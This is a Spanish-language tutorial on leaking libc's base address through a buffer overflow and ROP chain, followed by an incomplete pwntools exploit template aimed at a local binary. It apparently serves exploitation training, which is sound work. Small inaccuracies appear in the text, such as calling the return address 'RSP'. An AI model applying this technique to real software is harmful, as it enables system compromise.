## Pasos para filtrar la dirección base de libc:

### Identificación de direcciones clave:

`__libc_start_main`: Es un símbolo importante en libc que suele utilizarse como referencia para calcular la base de la librería. Se encuentra en las secciones de símbolos del binario objetivo.

`puts`: Una función de la biblioteca estándar que imprime cadenas. Su entrada en la PLT (Procedure Linkage Table) permite llamar a esta función, útil para imprimir direcciones de memoria.

`main`: Se utiliza para regresar al flujo normal del programa tras el leak, permitiendo continuar con la explotación.


### Construcción del payload:

El payload incluye:

* Un desbordamiento controlado para sobrescribir el puntero de retorno del stack(RSP).

* La dirección del gadget `pop rdi; ret` para controlar el registro RDI (donde se pasa el argumento de la función `puts`).

* La dirección de `__libc_start_main` como argumento para `puts`, lo que permite imprimir su dirección actual en memoria.

* Una redirección a la función `main` para reiniciar el programa después del leak.




### Ejecución del payload:

Envía el payload al binario a través de la entrada del programa vulnerable (probablemente un buffer de entrada que no valida su tamaño).

Esto provoca un desbordamiento de búfer que sobrescribe el retorno de la función y redirige el flujo de ejecución al gadget `pop rdi; ret`, seguido de una llamada a `puts`.



### Obtención del leak:

La función `puts` imprime la dirección de `__libc_start_main` directamente en la salida estándar.

El script captura esta salida utilizando `io.recvline()` y la convierte a un número de 64 bits con `u64`.


### Cálculo de la dirección base de libc:

Resta el offset conocido de `__libc_start_main` dentro de `libc` (obtenido del archivo libc.so.6) a la dirección filtrada. Esto da como resultado la **dirección base de libc**.
```python
#leaked_libc_address.py
from pwn import *


def leak_libc_addr(io, elf, libc, rop):
    
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    LIBC = elf.symbols["__libc_start_main"]
    MAIN = elf.symbols["main"]
    PUTS = elf.plt["puts"]
    
    log.info("pop rdi -> %s" % hex(POP_RDI))
    log.info("libc -> %s" % hex(LIBC))
    log.info("main -> %s" % hex(MAIN))
    log.info("puts -> %s" % hex(PUTS))
    
    offset = #Write the offset
    
    payload = b"A"*offset
    payload += p64(POP_RDI)
    payload += p64(LIBC)
    payload += p64(PUTS)
    payload += p64(MAIN)
    
    io.recvuntil("") #Recive data string to send payload on buffer overflow
    io.sendline(payload)
    
    #Change this line salts to leaked libc address(+ or -)
    io.recvline()
    io.recvline()
    
    leaked_libc = io.recvline().strip()
    leaked_libc = u64(leaked_libc.ljust(8, b"\x00"))
    
    log.info("leaked_libc_address -> %s" % hex(leaked_libc))
    
    return leaked_libc
    
if __name__ == '__main__':
    
    binary = './binary'
    io = process(binary)
    
    elf = ELF(binary)
    libc = ELF('./libc.so.6')#example
    rop = ROP(elf)
    
    leaked_libc_addr = leak_libc_addr(io, elf, libc, rop)
    
    real_libc_addr = leaked_libc_addr - libc.sym["__libc_start_main"]
    
    log.info("real_libc_address -> %s" % hex(real_libc_addr))
```
